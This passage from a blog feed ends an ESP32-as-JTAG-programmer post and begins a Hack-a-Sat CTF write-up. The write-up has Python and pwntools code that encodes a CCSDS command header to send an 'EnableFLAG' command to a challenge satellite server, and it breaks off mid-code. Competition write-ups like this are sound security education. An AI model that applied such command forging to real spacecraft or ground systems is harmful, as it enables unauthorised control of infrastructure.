        <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"WiFi connected."</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"IP address: "</span><span class="p">);</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">WiFi</span><span class="p">.</span><span class="n">localIP</span><span class="p">());</span>
    <span class="n">server</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">WiFiClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="n">available</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// if you get a client,</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"New Client."</span><span class="p">);</span>  <span class="c1">// print a message out the serial port</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">connected</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="sc">'B'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'b'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'R'</span><span class="p">:</span>
                      <span class="n">client</span><span class="p">.</span><span class="n">print</span><span class="p">((</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">PIN_TDO</span><span class="p">)</span> <span class="o">==</span> <span class="n">HIGH</span><span class="p">)</span> <span class="o">?</span> <span class="sc">'1'</span> <span class="o">:</span> <span class="sc">'0'</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'Q'</span><span class="p">:</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'0'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'4'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'6'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TMS</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TDI</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_LED</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_TCK</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'r'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'t'</span><span class="p">:</span>
                      <span class="c1">// SRST=0, which confusingly means to *exit* reset (as /RESET and /TRST are active-low)</span>
                      <span class="c1">// We don't have a TRST connection, so 'r' and 't' do the same thing.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, HIGH);</span>
                      <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="sc">'s'</span><span class="p">:</span>
                    <span class="k">case</span> <span class="sc">'u'</span><span class="p">:</span>
                      <span class="c1">// SRST=1 -- enter RESET state</span>
                      <span class="c1">// Likewise for 's' and 'u'.</span>
                      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">PIN_SRST</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
                      <span class="c1">//digitalWrite(PIN_CHIP_EN, LOW);</span>
                      <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Client disconnected"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So yesterday someone sent me a link that was not related to that, but I found this lib:
<a href="http://www.clifford.at/libxsvf/"><strong>Lib(X)SVF - A library for implementing SVF and XSVF JTAG players</strong>
<em>JTAG (IEEE 1149.1, aka “Boundary Scan”) is a standard IC testing, debugging and programming port. SVF (Serial Vector…</em>www.clifford.at</a></p>

<p>Basically it was written by the same person that did the reverse engineer for ICE40 FPGA Bitstream (and several others) and make a nice lib to “play” the SVF and XSVF files. It was pretty straightforward to implement a programmer using the ESP32. Basically you only had to implement a few functions and the player would work.</p>

<p>I went through a lot of work to make it nice to use, so I will not explain in details here. But the source code is available here: <a href="https://github.com/racerxdl/esp32-rjtag">https://github.com/racerxdl/esp32-rjtag</a></p>

<p>Basically you can run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload.py /dev/ttyUSB0 file.svf
</code></pre></div></div>

<p>And it will write the FPGA for you. Here is a video of working:</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">FINALLY. Now I can use the ESP32 as JTAG programmer for Lattice FPGA. Soon I will able to program through wifi and pipe a serial debug port as well. <a href="https://t.co/zs41v47BvU">pic.twitter.com/zs41v47BvU</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1272019368617095173?ref_src=twsrc%5Etfw">June 14, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>I also added a simple command to switch the ESP32 from programming mode to Serial Passthrough. This way, after programming it can pipe all FPGA Serial Calls to the ESP32 serial. Then I did this small Serial Hello World for testing it:
<a href="https://github.com/racerxdl/fpga-serial-hello"><strong>racerxdl/fpga-serial-hello</strong></a></p>

<p>Which basically keeps sending Hello World through the serial port forever. And it does work!</p>

<p><img src="/assets/posts/medium/1_Z8RdW5i7NQh7KUEC5v5NFg.png" alt="Hello World output from FPGA" /><em>Hello World output from FPGA</em></p>

<p>My next steps is to make this work through network instead of serial port. Which would be really amazing!</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hacking a ESP32 into FPGA Board]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T22:02:00+00:00</published><updated>2020-05-31T22:02:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<h1 id="hack-a-sattalk-to-me-goose">Hack a Sat — Talk to me, Goose</h1>

<p>The “Talk to me, Goose challenge” on Hackasat</p>

<p>This challenge is just after the “Can you hear me now?” challenge (see <a href="/2020/05/hack-a-sat-can-you-hear-me-now/">Hack a Sat - Can you hear me now?</a> ). Now LaunchDotCom has a new Satellite called Carnac 2.0.</p>

<p>There are two attached files. The first one is the manual of the satellite in which we can see the onboard equipment:</p>

<p><img src="/assets/posts/medium/1_Yn5BggzZddP21yFopKx9PA.png" alt="System Diagram of Carnac 2.0 Satellite" /><em>System Diagram of Carnac 2.0 Satellite</em></p>

<p>There is also a XTCE file in which the Telemetry Data looks the same as previous challenge, but now there is a Command Section which implies that we will need to send commands back to the satellite. If we connect to the telemetry server and run the bonus script form the previous challenge, we will see that is only transmitting EPS</p>

<p><img src="/assets/posts/medium/1_QGRnvC2S4sj_gM_8HHvXGQ.png" alt="EPS Telemetry Data" /><em>EPS Telemetry Data</em></p>

<p>Also you can see that most of the equipments are off. The one that interest us is the FLAG_ENABLE which enables the FLAG Generator equipment to output our flag.</p>

<p>So I went directly to the XTCE to find a Enable Flag command that would toggle that. I found this section:</p>

<p><img src="/assets/posts/medium/1_GgD477ihhBIjwsjG9yQReQ.png" alt="EnableFLAG command" /><em>EnableFLAG command</em></p>

<p>The logic is the same as applied for the previous flag, but now instead is for encoding a command and sending back to the satellite. We can assume we can send data back using the same connection we opened to the telemetry server. So I first created a encoder for the header:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

</code></pre></div></div>

<p>Then the missing data would be 3 bytes:</p>

<ul>
  <li>CMD =&gt; Which tells the command to execute</li>
  <li>PARAM =&gt; The command parameter</li>
  <li>PowerState =&gt; To enable the power</li>
</ul>

<p>Since we would need to send data back, I decided to use the pwntools library ( see <a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a> ) and make a realtime decoder for the telemetry.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">binascii</span>

<span class="kn">from</span> <span class="n">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>


<span class="n">APID_FLAG_PACKET</span> <span class="o">=</span> <span class="mi">102</span>
<span class="n">APID_EPS_PACKET</span> <span class="o">=</span> <span class="mi">103</span>
<span class="n">APID_PAYLOAD_PACKET</span> <span class="o">=</span> <span class="mi">105</span>

<span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sh">"</span><span class="s">08b</span><span class="sh">"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="sh">""</span>

  <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="sh">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">def</span> <span class="nf">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">battemp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">voltage</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">low_pwr_thresh</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>

